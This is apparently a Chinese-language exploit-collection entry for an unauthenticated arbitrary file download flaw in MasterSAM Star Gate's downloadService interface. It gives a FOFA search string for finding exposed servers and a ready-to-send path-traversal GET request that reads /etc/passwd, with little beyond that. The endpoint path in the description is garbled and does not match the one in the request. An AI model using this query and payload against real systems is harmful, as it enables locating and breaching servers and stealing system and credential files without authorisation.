# MasterSAM接口downloadService任意文件读取

**MasterSAM Star Gate的/adamaladamalduwnoadService接口存在任意文件下载漏洞，未经身份验证的攻击者可以通过该漏洞下载服务器任意文件，从而获取大量敏感信息。**

## fofa

```javascript
body="MasterSAM"
```

## poc

```javascript
GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1
Host: your-ip
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502131406477.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/f35n0-9OOME5gSsiwEv0Vg